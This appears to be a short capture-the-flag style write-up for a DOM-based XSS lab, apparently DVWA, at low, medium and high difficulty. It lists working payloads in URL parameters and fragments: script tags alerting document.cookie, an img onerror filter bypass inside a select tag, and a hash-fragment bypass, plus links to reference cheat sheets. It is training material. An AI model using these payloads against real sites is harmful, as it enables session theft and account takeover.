# XSS-DOM 
Difficulty: Low

/?default=English<script>alert(document.cookie)</script>          </br>
/?default=English<script>alert(1)</script>                        </br>

Difficulty: Medium

Read help & source. Also, ispect Language select section.                                 </br>
/?default=<select><img title=<img src onerror=alert(document.cookie)></select>            </br>
/?default=<select><img src/onerror=alert(document.cookie)></select>                       </br>
Res: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet                </br>

Difficulty: High

/?#default=<script>alert(document.cookie)</script>                    [# URI fragments is not sent to the server by the browser] </br>
Res: https://owasp.org/www-community/attacks/DOM_Based_XSS#:~:text=Definition,in%20an%20%E2%80%9Cunexpected%E2%80%9D%20manner.


